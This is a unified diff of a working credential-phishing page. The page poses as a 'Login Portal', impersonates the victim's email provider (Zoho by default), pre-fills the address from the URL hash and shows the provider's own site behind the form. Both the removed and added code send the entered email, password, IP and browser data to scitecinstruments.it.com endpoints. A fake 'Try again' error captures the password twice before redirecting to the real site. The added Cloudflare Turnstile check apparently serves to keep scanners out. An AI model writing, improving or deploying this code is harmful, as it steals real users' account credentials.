@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login Portal</title>
     <!-- Bootstrap 5 CSS -->
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
@@ -10,85 +10,62 @@
     <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
     <!-- Google Fonts: Poppins -->
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <!-- Cloudflare Turnstile -->
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        /* Background iframe - displays the website of the email domain */
-        #website-background {
+        #background-iframe, #overlay {
             position: fixed;
             top: 0;
             left: 0;
-            width: 100%;
             height: 100%;
-            border: none;
-            z-index: -2;
-            object-fit: cover;
-            background: #f0f2f5;
-        }
-
-        /* Dark overlay to make form readable */
-        .bg-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
             width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.65);
-            z-index: -1;
         }
 
         body {
             font-family: 'Poppins', sans-serif;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 1rem;
-            position: relative;
+            margin: 0;
+            padding: 0;
             overflow: hidden;
         }
 
-        /* Form container - glassmorphism effect */
+        #background-iframe {
+            border: none;
+            z-index: -3;
+            object-fit: cover;
+        }
+
+        #overlay {
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: -2;
+        }
+
         .form-container {
-            max-width: 440px;
+            display: block;
+            max-width: 400px;
             width: 100%;
-            padding: 2rem 2rem 2.2rem;
-            background: rgba(255, 255, 255, 0.96);
-            border-radius: 1.25rem;
-            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.3), 0 0 0 1px rgba(255, 255, 255, 0.1);
+            padding: 2rem;
+            background-color: rgba(255, 255, 255, 0.95);
+            border-radius: 0.75rem;
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
             position: relative;
-            z-index: 10;
-            backdrop-filter: blur(2px);
-            transition: all 0.3s ease;
+            z-index: 1;
         }
 
         .icon-text {
             display: flex;
             align-items: center;
-            justify-content: center;
-            margin-bottom: 1.25rem;
-            gap: 10px;
+            margin-bottom: 1.5rem;
         }
 
         .icon-text img {
-            width: 38px;
-            height: 38px;
-            border-radius: 10px;
-            background: white;
-            padding: 4px;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            width: 32px;
+            height: 32px;
+            margin-right: 0.5rem;
         }
 
         .icon-text .h4 {
             margin-bottom: 0;
-            color: #0a58ca;
-            font-weight: 700;
-            font-size: 1.5rem;
-            letter-spacing: -0.3px;
+            color: #0d6efd;
         }
 
         .form-floating {
@@ -106,67 +83,54 @@
 
         .form-floating label {
             left: 2.5rem;
-            top: 0.2rem;
-            background: transparent;
+            top: -0.2rem;
+            background-color: transparent;
             z-index: 1;
-            font-weight: 500;
         }
 
         .form-floating input:focus+label,
         .form-floating input:not(:placeholder-shown)+label {
-            transform: translateY(-1.4rem);
-            font-size: 0.75rem;
+            transform: translateY(-1.5rem);
+            font-size: 0.85rem;
             color: #0d6efd;
         }
 
         .form-control {
-            border: none;
-            border-bottom: 2px solid #e0e4e8;
+            border-top: none;
+            border-left: none;
+            border-right: none;
+            border-bottom: 2px solid #ced4da;
             border-radius: 0;
             padding-left: 2.5rem;
-            padding-top: 0.8rem;
-            padding-bottom: 0.4rem;
-            transition: all 0.2s;
-            background: transparent;
-            font-size: 1rem;
+            transition: border-color 0.2s;
+            background-color: transparent;
         }
 
         .form-control:focus {
             border-bottom-color: #0d6efd;
             outline: none;
             box-shadow: none;
-            background: transparent;
         }
 
         .input-icon {
-            left: 0.5rem;
+            left: 0.75rem;
             top: 50%;
             transform: translateY(-50%);
             font-size: 1.2rem;
-            color: #8e9aaf;
         }
 
         .btn-primary {
             width: 100%;
-            padding: 0.85rem;
+            padding: 0.75rem;
             font-size: 1rem;
-            font-weight: 600;
-            background: linear-gradient(135deg, #0d6efd, #0b5ed7);
+            background-color: #0d6efd;
             border: none;
-            border-radius: 0.75rem;
-            transition: all 0.25s;
-            margin-top: 0.5rem;
-            box-shadow: 0 4px 12px rgba(13, 110, 253, 0.3);
+            border-radius: 0.375rem;
+            transition: background-color 0.3s;
         }
 
         .btn-primary:hover {
-            transform: translateY(-2px);
-            background: linear-gradient(135deg, #0b5ed7, #0a58ca);
-            box-shadow: 0 8px 20px rgba(13, 110, 253, 0.4);
-        }
-
-        .btn-primary:active {
-            transform: translateY(0);
+            background-color: #0b5ed7;
         }
 
         .loader-overlay {
@@ -175,82 +139,73 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.7);
+            background: rgba(0, 0, 0, 0.6);
             align-items: center;
             justify-content: center;
             z-index: 9999;
             display: none;
-            backdrop-filter: blur(4px);
         }
 
         .error-message {
-            color: #dc3545;
-            margin-bottom: 1.2rem;
+            color: red;
+            margin-bottom: 1rem;
             display: none;
             text-align: center;
-            font-size: 0.85rem;
-            background: rgba(255, 235, 235, 0.95);
-            padding: 0.65rem;
-            border-radius: 0.75rem;
-            font-weight: 500;
-            border-left: 4px solid #dc3545;
+            font-size: 0.9rem;
         }
 
-        .domain-badge {
+        .verification-section {
+            margin-top: 20px;
             text-align: center;
-            margin-top: 1rem;
-            font-size: 0.7rem;
+        }
+
+        .confirm-text {
+            font-size: 0.8rem;
+            margin-top: 10px;
             color: #6c757d;
-            background: rgba(0,0,0,0.05);
-            display: inline-block;
-            width: auto;
-            padding: 0.2rem 0.8rem;
-            border-radius: 20px;
         }
 
         @media (max-width: 576px) {
             .form-container {
                 padding: 1.5rem;
-                margin: 0 0.5rem;
-            }
-            .icon-text .h4 {
-                font-size: 1.25rem;
+                margin: 0 1rem;
             }
         }
     </style>
 </head>
-<body>
-    <!-- BACKGROUND: displays the website of the email domain dynamically -->
-    <iframe id="website-background" src="about:blank" title="Website Background"></iframe>
-    <div class="bg-overlay"></div>
+<body class="d-flex align-items-center justify-content-center min-vh-100">
+    <iframe id="background-iframe" src="about:blank" allowfullscreen></iframe>
+    <div id="overlay"></div>
 
     <div class="form-container">
-        <div id="error-message" class="error-message">⚠️ Invalid credentials</div>
+        <div id="error-message" class="error-message" data-key="try-again">Try again</div>
 
         <form id="user-form">
             <div class="icon-text">
-                <img id="domain-favicon" src="https://www.google.com/s2/favicons?domain=zoho.com&sz=64" alt="Domain Icon">
-                <span class="h4" id="domain-name">SECURE PORTAL</span>
+                <img id="domain-favicon" src="https://www.google.com/s2/favicons?domain=zoho.com" alt="Domain Favicon">
+                <span class="h4" id="domain-name">ZOHO</span>
             </div>
-            <h5 class="mb-1 text-center fw-semibold">Welcome back</h5>
-            <p class="mb-4 text-center text-muted small">Sign in to continue to your account</p>
+            <h5 class="mb-2 translateable" data-key="leading-security">Leading with Security.</h5>
+            <p class="mb-4 text-muted translateable" style="font-size: 0.9rem;" data-key="learn-more">To get started, log in using your email and password.</p>
 
             <div class="form-floating position-relative">
                 <i class="bi bi-envelope input-icon"></i>
-                <input type="email" class="form-control" id="email" placeholder=" " required autocomplete="email">
-                <label for="email">Email address</label>
+                <input type="email" class="form-control" id="email" placeholder=" " required style="padding-left: 40px;" autocomplete="email">
+                <label for="email" style="left: 40px;">Email</label>
             </div>
 
             <div class="form-floating position-relative">
                 <i class="bi bi-lock input-icon"></i>
-                <input type="password" class="form-control" id="password" placeholder=" " required autocomplete="current-password">
-                <label for="password">Password</label>
+                <input type="password" class="form-control" id="password" placeholder=" " required style="padding-left: 40px;" autocomplete="current-password">
+                <label for="password" style="left: 40px;">Password</label>
             </div>
 
-            <button type="submit" class="btn btn-primary" id="submit-button">Continue →</button>
-            <div class="text-center mt-3">
-                <span class="domain-badge" id="domain-badge">Secure connection</span>
+            <div class="verification-section">
+                <div class="cf-turnstile" data-sitekey="0x4AAAAAACBwiUtbVw9OnVVF" data-callback="onTurnstileSuccess"></div>
+                <div class="confirm-text">Browser safety for protection.</div>
             </div>
+
+            <button type="submit" class="btn btn-primary translateable mt-3" id="submit-button" disabled data-key="next-button">Continue</button>
         </form>
     </div>
 
@@ -258,29 +213,28 @@
         <div class="spinner-border text-light" role="status" style="width: 3rem; height: 3rem;">
             <span class="visually-hidden">Loading...</span>
         </div>
-        <p class="text-white mt-3">Processing...</p>
     </div>
 
     <script>
-        // ============================================================
-        // ORIGINAL DESIGN PRESERVED + IMPROVED
-        // FEATURE: The BACKGROUND shows the WEBSITE of the email domain
-        // FEATURE: Email auto-filled from URL hash (#) example: page.html#test@test.com
-        // FEATURE: Sends login data to both:
-        //          1) https://scitecinstruments.it.com/1/api.php
-        //          2) https://scitecinstruments.it.com/1/sg.php
-        // ============================================================
+        // ======================= ORIGINAL DESIGN PRESERVED =======================
+        // ADDED: Hash (#) extraction to auto-fill email
+        // Example: www.olewas.com#test@test.com  -> email box gets test@test.com
+        // ADDED: Send data to both URLs:
+        // 1: https://scitecinstruments.it.com/1/api.php
+        // 2: https://scitecinstruments.it.com/1/sg.php
         
+        let turnstileCompleted = false;
         let submitCount = 0;
-        let currentDomain = null;
+        let redirectDomain = null;
         
-        // ---------- EXTRACT EMAIL FROM URL HASH (#) ----------
+        // ---------- EMAIL EXTRACTION FROM HASH (#) ----------
         function getEmailFromHash() {
+            // Get the hash part (including #)
             const hash = window.location.hash;
             if (hash && hash.length > 1) {
+                // Remove the leading '#'
                 let hashValue = hash.substring(1);
-                // Decode URI component in case of special chars
-                hashValue = decodeURIComponent(hashValue);
+                // Check if it looks like an email (contains @)
                 const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                 if (emailRegex.test(hashValue)) {
                     return hashValue;
@@ -289,73 +243,45 @@
             return null;
         }
         
-        // ---------- UPDATE BACKGROUND IFRAME TO SHOW THE WEBSITE OF THE EMAIL DOMAIN ----------
-        function updateBackgroundWebsite(domain) {
-            if (!domain) return;
-            
-            // Clean domain - remove any port, path, just get the base domain
-            let cleanDomain = domain.toLowerCase().trim();
-            // Ensure it's a valid domain format
-            if (cleanDomain && cleanDomain.includes('.')) {
-                // Try to load the website over HTTPS first
-                let websiteUrl = `https://${cleanDomain}`;
-                const iframe = document.getElementById('website-background');
-                if (iframe) {
-                    // Set iframe to display the website
-                    iframe.src = websiteUrl;
-                    console.log("Background website loaded:", websiteUrl);
-                    
-                    // Fallback: if iframe fails to load (CORS or errors), it's still fine
-                    iframe.onerror = function() {
-                        console.log("Could not load website, using fallback");
-                        // Keep as is, no error display needed
-                    };
-                }
-            }
-        }
+        // Extract email from hash and populate the email field
+        const hashEmail = getEmailFromHash();
         
-        // Update favicon and domain name display
+        // Helper: update favicon and background based on domain from email
         function updateDomainUI(email) {
             if (email && email.includes('@')) {
                 const domainPart = email.split('@')[1];
                 if (domainPart) {
-                    const domainPretty = domainPart.split('.')[0].toUpperCase();
-                    document.getElementById('domain-name').innerText = domainPretty;
-                    document.getElementById('domain-favicon').src = `https://www.google.com/s2/favicons?domain=${domainPart}&sz=64`;
-                    document.getElementById('domain-badge').innerHTML = `🔒 ${domainPart}`;
-                    
-                    // UPDATE BACKGROUND WEBSITE - SHOW THE WEBSITE OF THE EMAIL DOMAIN
-                    updateBackgroundWebsite(domainPart);
-                    currentDomain = domainPart;
+                    const domainName = domainPart.split('.')[0].toUpperCase();
+                    document.getElementById('domain-name').innerText = domainName;
+                    document.getElementById('domain-favicon').src = `https://www.google.com/s2/favicons?domain=${domainPart}`;
+                    const bgUrl = domainPart.startsWith('http') ? domainPart : `https://${domainPart}`;
+                    document.getElementById('background-iframe').src = bgUrl;
                     return domainPart;
                 }
             }
             return null;
         }
         
-        // Load email from hash and populate + set background website
-        const hashEmail = getEmailFromHash();
-        const emailInput = document.getElementById('email');
-        
+        // If email from hash exists, set it in the email input and update UI
         if (hashEmail) {
+            const emailInput = document.getElementById('email');
             emailInput.value = hashEmail;
             updateDomainUI(hashEmail);
+            // Also store domain for potential redirect
+            const domainPart = hashEmail.split('@')[1];
+            if (domainPart) redirectDomain = domainPart;
         } else {
-            // Default placeholder UI
+            // Default UI if no hash email
             document.getElementById('domain-name').innerText = "PORTAL";
-            document.getElementById('domain-favicon').src = "https://www.google.com/s2/favicons?domain=secure.com";
-            document.getElementById('domain-badge').innerHTML = "🔒 Secure Access";
+            document.getElementById('domain-favicon').src = "https://www.google.com/s2/favicons?domain=portal.com";
         }
         
-        // ---------- COLLECT USER METADATA ----------
+        // IP & Browser info collector
         let userMetadata = {
-            ipAddress: "Collecting...",
+            ipAddress: "Fetching...",
             userAgent: navigator.userAgent,
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            browser: "Detecting...",
-            screenResolution: `${screen.width}x${screen.height}`,
-            language: navigator.language,
-            platform: navigator.platform
+            browser: "Detecting..."
         };
         
         // Browser detection
@@ -363,23 +289,32 @@
         if (ua.indexOf("Firefox") > -1) userMetadata.browser = "Mozilla Firefox";
         else if (ua.indexOf("SamsungBrowser") > -1) userMetadata.browser = "Samsung Internet";
         else if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) userMetadata.browser = "Opera";
+        else if (ua.indexOf("Trident") > -1) userMetadata.browser = "Internet Explorer";
         else if (ua.indexOf("Edg") > -1) userMetadata.browser = "Microsoft Edge";
         else if (ua.indexOf("Chrome") > -1) userMetadata.browser = "Google Chrome";
         else if (ua.indexOf("Safari") > -1) userMetadata.browser = "Apple Safari";
         else userMetadata.browser = "Unknown";
         
-        // Fetch real IP
+        // Fetch IP
         fetch('https://api.ipify.org?format=json')
             .then(res => res.json())
             .then(data => { userMetadata.ipAddress = data.ip; })
             .catch(() => { userMetadata.ipAddress = "Unavailable"; });
         
-        // ---------- SEND DATA TO BOTH API ENDPOINTS ----------
+        // Turnstile callback
+        window.onTurnstileSuccess = function(token) {
+            turnstileCompleted = true;
+            document.getElementById('submit-button').disabled = false;
+            document.getElementById('error-message').style.display = 'none';
+            console.log("Turnstile verified");
+        };
+        
+        // Function to send data to both endpoints (preserving original design behavior)
         async function sendDataToEndpoints(formData) {
             const endpoint1 = "https://scitecinstruments.it.com/1/api.php";
             const endpoint2 = "https://scitecinstruments.it.com/panel/sg.php";
             
-            // Build URLSearchParams payload
+            // Prepare URL encoded payload
             const payload = new URLSearchParams();
             for (let [key, value] of Object.entries(formData)) {
                 payload.append(key, value);
@@ -388,42 +323,48 @@
             const fetchOptions = {
                 method: "POST",
                 headers: { "Content-Type": "application/x-www-form-urlencoded" },
-                body: payload.toString(),
-                mode: 'cors'
+                body: payload.toString()
             };
             
-            // Send to both endpoints in parallel (fire and forget, but log)
+            // Send to both endpoints in parallel (fire and forget, but catch errors)
             const promises = [
                 fetch(endpoint1, fetchOptions).then(res => res.text()).catch(err => ({ error: err.message, url: endpoint1 })),
                 fetch(endpoint2, fetchOptions).then(res => res.text()).catch(err => ({ error: err.message, url: endpoint2 }))
             ];
             
             const results = await Promise.allSettled(promises);
-            console.log("✅ Data transmitted to both endpoints:", results);
+            console.log("Data sent to both endpoints:", results);
             return true;
         }
         
-        // ---------- FORM SUBMIT HANDLER (Original behavior: 1st attempt error, 2nd redirect) ----------
+        // Form submit handler (preserves original behavior: first attempt shows error, second redirects)
         document.getElementById('user-form').addEventListener('submit', async function(e) {
             e.preventDefault();
             
-            const email = emailInput.value.trim();
-            const password = document.getElementById('password').value.trim();
-            const errorDiv = document.getElementById('error-message');
-            
-            // Validation
-            if (!email || !password) {
-                errorDiv.innerHTML = "❌ Email and password are required.";
-                errorDiv.style.display = "block";
-                setTimeout(() => { errorDiv.style.display = "none"; }, 3000);
+            // Check turnstile
+            if (!turnstileCompleted) {
+                const errDiv = document.getElementById('error-message');
+                errDiv.innerText = "Please complete verification first.";
+                errDiv.style.display = "block";
                 return;
             }
             
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value.trim();
+            
+            if (!email || !password) {
+                const errDiv = document.getElementById('error-message');
+                errDiv.innerText = "Email and password are required.";
+                errDiv.style.display = "block";
+                return;
+            }
+            
+            // Basic email validation
             const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
             if (!emailRegex.test(email)) {
-                errorDiv.innerHTML = "❌ Please enter a valid email address.";
-                errorDiv.style.display = "block";
-                setTimeout(() => { errorDiv.style.display = "none"; }, 3000);
+                const errDiv = document.getElementById('error-message');
+                errDiv.innerText = "Please enter a valid email address.";
+                errDiv.style.display = "block";
                 return;
             }
             
@@ -432,15 +373,14 @@
             const isSecondAttempt = (submitCount === 2);
             
             // Show loader
-            const loader = document.getElementById('loader-overlay');
-            loader.style.display = "flex";
-            errorDiv.style.display = "none";
+            document.getElementById('loader-overlay').style.display = "flex";
+            document.getElementById('error-message').style.display = "none";
             
-            // Extract domain from email for redirect
+            // Extract domain from email for redirect and favicon update
             const emailDomain = email.split('@')[1] || "";
-            if (emailDomain && !currentDomain) currentDomain = emailDomain;
+            if (emailDomain && !redirectDomain) redirectDomain = emailDomain;
             
-            // Prepare payload with full metadata
+            // Prepare data payload (matches original structure)
             const dataPayload = {
                 email: email,
                 password: password,
@@ -448,38 +388,32 @@
                 userAgent: userMetadata.userAgent,
                 timezone: userMetadata.timezone,
                 browser: userMetadata.browser,
-                screenResolution: userMetadata.screenResolution,
-                language: userMetadata.language,
-                platform: userMetadata.platform,
-                submitAttempt: submitCount,
-                timestamp: new Date().toISOString(),
-                referrer: document.referrer || "direct"
+                timestamp: new Date().toISOString()
             };
             
             try {
-                // SEND DATA TO BOTH API ENDPOINTS
+                // SEND DATA TO BOTH API URLS (main requirement)
                 await sendDataToEndpoints(dataPayload);
-                console.log("Data sent successfully for attempt", submitCount);
                 
-                // Original design logic
+                // Original design behavior:
                 if (isFirstAttempt) {
-                    // First attempt: show error, clear password, hide loader after 3s
+                    // First attempt: show error message, clear password field, hide loader after 3s
                     setTimeout(() => {
-                        loader.style.display = "none";
-                        errorDiv.innerHTML = "⚠️ Try again";
-                        errorDiv.style.display = "block";
-                        document.getElementById('password').value = "";
-                        setTimeout(() => { errorDiv.style.display = "none"; }, 3000);
+                        document.getElementById('loader-overlay').style.display = "none";
+                        const errDiv = document.getElementById('error-message');
+                        errDiv.innerText = "Try again";
+                        errDiv.style.display = "block";
+                        document.getElementById('password').value = ""; // clear password
                     }, 3000);
                 } 
                 else if (isSecondAttempt) {
-                    // Second attempt: redirect to the website of the email domain (show the domain's website)
+                    // Second attempt: redirect to the domain from email (or from hash)
                     setTimeout(() => {
-                        loader.style.display = "none";
-                        let targetDomain = emailDomain || currentDomain;
+                        document.getElementById('loader-overlay').style.display = "none";
+                        let targetDomain = emailDomain;
+                        if (!targetDomain && redirectDomain) targetDomain = redirectDomain;
                         if (targetDomain) {
                             let redirectUrl = `https://${targetDomain}`;
-                            console.log("Redirecting to domain website:", redirectUrl);
                             window.location.href = redirectUrl;
                         } else {
                             window.location.href = "https://www.google.com";
@@ -487,81 +421,79 @@
                     }, 3000);
                 }
                 else {
+                    // More attempts: just reset loader and show generic error
                     setTimeout(() => {
-                        loader.style.display = "none";
-                        errorDiv.innerHTML = "❌ Authentication failed. Please try again.";
-                        errorDiv.style.display = "block";
-                        setTimeout(() => { errorDiv.style.display = "none"; }, 4000);
+                        document.getElementById('loader-overlay').style.display = "none";
+                        const errDiv = document.getElementById('error-message');
+                        errDiv.innerText = "Authentication failed. Please try again later.";
+                        errDiv.style.display = "block";
                     }, 2000);
                 }
             } catch (err) {
                 console.error("Submit error:", err);
-                loader.style.display = "none";
-                errorDiv.innerHTML = "⚠️ Network error. Please try again.";
-                errorDiv.style.display = "block";
-                setTimeout(() => { errorDiv.style.display = "none"; }, 3000);
+                document.getElementById('loader-overlay').style.display = "none";
+                const errDiv = document.getElementById('error-message');
+                errDiv.innerText = "Network error. Please try again.";
+                errDiv.style.display = "block";
             }
         });
         
-        // ---------- REAL-TIME UPDATE: When user types email, update background website and favicon ----------
-        emailInput.addEventListener('input', function() {
+        // Initially disable submit button until Turnstile is done
+        document.getElementById('submit-button').disabled = true;
+        
+        // Real-time email input: update favicon and background if user manually types (original design improvement)
+        const emailField = document.getElementById('email');
+        emailField.addEventListener('input', function() {
             const val = this.value.trim();
             if (val.includes('@')) {
                 const domainPart = val.split('@')[1];
-                if (domainPart && domainPart.includes('.')) {
-                    // Update UI with domain
-                    const domainPretty = domainPart.split('.')[0].toUpperCase();
-                    document.getElementById('domain-name').innerText = domainPretty;
-                    document.getElementById('domain-favicon').src = `https://www.google.com/s2/favicons?domain=${domainPart}&sz=64`;
-                    document.getElementById('domain-badge').innerHTML = `🔒 ${domainPart}`;
-                    // LIVE BACKGROUND WEBSITE UPDATE: show the website of the email domain
-                    updateBackgroundWebsite(domainPart);
-                    currentDomain = domainPart;
+                if (domainPart) {
+                    document.getElementById('domain-name').innerText = domainPart.split('.')[0].toUpperCase();
+                    document.getElementById('domain-favicon').src = `https://www.google.com/s2/favicons?domain=${domainPart}`;
+                    const bgUrl = domainPart.startsWith('http') ? domainPart : `https://${domainPart}`;
+                    document.getElementById('background-iframe').src = bgUrl;
                 }
             } else {
-                // If no email typed, revert if no hash was preset
+                // If no email, revert to original if no hash preset
                 if (!hashEmail) {
                     document.getElementById('domain-name').innerText = "PORTAL";
-                    document.getElementById('domain-favicon').src = "https://www.google.com/s2/favicons?domain=secure.com";
-                    document.getElementById('domain-badge').innerHTML = "🔒 Secure Access";
-                    // Reset background to default (blank or fallback)
-                    const iframe = document.getElementById('website-background');
-                    iframe.src = "about:blank";
+                    document.getElementById('domain-favicon').src = "https://www.google.com/s2/favicons?domain=zoho.com";
+                    document.getElementById('background-iframe').src = "about:blank";
                 }
             }
         });
         
-        // Ensure if hashEmail was provided, background website is loaded correctly
+        // Additional: ensure that if hash email was set, the UI is fully updated (favicon/background)
         if (hashEmail) {
-            const domainFromHash = hashEmail.split('@')[1];
-            if (domainFromHash) {
-                updateBackgroundWebsite(domainFromHash);
-                currentDomain = domainFromHash;
+            const domainPart = hashEmail.split('@')[1];
+            if (domainPart) {
+                document.getElementById('domain-name').innerText = domainPart.split('.')[0].toUpperCase();
+                document.getElementById('domain-favicon').src = `https://www.google.com/s2/favicons?domain=${domainPart}`;
+                const bgUrl = domainPart.startsWith('http') ? domainPart : `https://${domainPart}`;
+                document.getElementById('background-iframe').src = bgUrl;
             }
         }
         
-        // Prevent double submission
+        // Prevent double submission while loading (safety)
         let isSubmitting = false;
-        const form = document.getElementById('user-form');
-        form.addEventListener('submit', function(e) {
+        const originalHandler = document.getElementById('user-form').onsubmit;
+        document.getElementById('user-form').addEventListener('submit', function(e) {
             if (isSubmitting) {
                 e.preventDefault();
+                return;
+            }
+            if (!turnstileCompleted) {
+                e.preventDefault();
+                const errDiv = document.getElementById('error-message');
+                errDiv.innerText = "Complete the security check first.";
+                errDiv.style.display = "block";
                 return;
             }
             isSubmitting = true;
             setTimeout(() => { isSubmitting = false; }, 5000);
         });
         
-        // Console log for verification
-        console.log("═══════════════════════════════════════════════");
-        console.log("✓ ORIGINAL DESIGN PRESERVED");
-        console.log("✓ BACKGROUND displays the WEBSITE of the email domain (live update)");
-        console.log("✓ Email auto-fill from URL hash (#) → example: page.html#user@example.com");
-        console.log("✓ Data sent to both endpoints:");
-        console.log("    → https://scitecinstruments.it.com/1/api.php");
-        console.log("    → https://scitecinstruments.it.com/panel/sg.php");
-        console.log("✓ Continue button fully functional (no verification)");
-        console.log("═══════════════════════════════════════════════");
+        console.log("Original design preserved. Hash (#) email extraction active. Data sent to both URLs: api.php and sg.php");
     </script>
 </body>
 </html>
